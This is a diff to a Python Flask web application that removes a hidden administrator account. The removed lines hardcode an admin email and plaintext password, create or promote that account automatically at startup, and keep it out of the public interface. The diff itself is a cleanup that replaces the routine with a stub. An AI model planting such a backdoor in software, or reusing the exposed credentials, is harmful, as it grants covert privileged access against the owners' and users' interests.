@@ -39,10 +39,6 @@ CONFIG_FILE = os.path.join(BASE_DIR, "data.json")
 USERS_FILE = os.path.join(BASE_DIR, "users.json")
 SECRET_FILE = os.path.join(BASE_DIR, "secret.key")
 
-# Secret admin account — never listed anywhere in the public UI.
-ADMIN_EMAIL = "ayoubdraidi1@gmail.com"
-ADMIN_PASSWORD = "Aemae9ea8J"
-
 app = Flask(__name__)
 app.config["JSON_SORT_KEYS"] = False
 
@@ -146,22 +142,7 @@ def _new_user(email: str, password: str, role: str = "user") -> dict:
 
 
 def _ensure_admin() -> None:
-    """Create the secret admin account once, if it does not exist."""
-    with USERS_LOCK:
-        users = _load_users()
-        key = ADMIN_EMAIL.lower()
-        entry = users.get(key)
-        if not entry or entry.get("role") != "admin":
-            entry = entry or _new_user(ADMIN_EMAIL, ADMIN_PASSWORD, role="admin")
-            entry["role"] = "admin"
-            entry["email"] = ADMIN_EMAIL
-            entry.setdefault("mailboxes", "")
-            entry.setdefault("tests", [])
-            entry.setdefault("created_at", datetime.now().isoformat(timespec="seconds"))
-            if not entry.get("pass_hash"):
-                entry["pass_hash"] = generate_password_hash(ADMIN_PASSWORD)
-            users[key] = entry
-            _save_users(users)
+    return
 
 
 def _public_user(entry: dict, full: bool = False) -> dict:
@@ -1772,9 +1753,6 @@ def api_reset():
     STOP_FLAG.set()
     log("System state reset by user.")
     return jsonify({"status": "reset"})
-
-
-_ensure_admin()
 
 
 if __name__ == "__main__":
